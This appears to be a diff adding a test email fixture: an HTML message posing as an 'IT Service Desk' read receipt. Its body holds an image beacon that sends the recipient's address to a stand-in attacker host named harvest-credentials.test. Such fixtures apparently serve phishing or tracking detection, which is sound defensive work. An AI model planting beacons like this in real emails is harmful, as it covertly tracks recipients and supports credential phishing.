@@ -1,0 +1,8 @@
+From: "IT Service Desk" <security@security.example.edu>
+To: staff@example.edu
+Subject: Img Src Beacon
+Authentication-Results: mx.example.edu; spf=pass smtp.mailfrom=security.example.edu; dkim=pass header.d=security.example.edu; dmarc=pass
+Content-Type: text/html; charset="utf-8"
+MIME-Version: 1.0
+
+<html><body><p>Read receipt.</p><img src="https://harvest-credentials.test/t?to=staff@example.edu"></body></html>
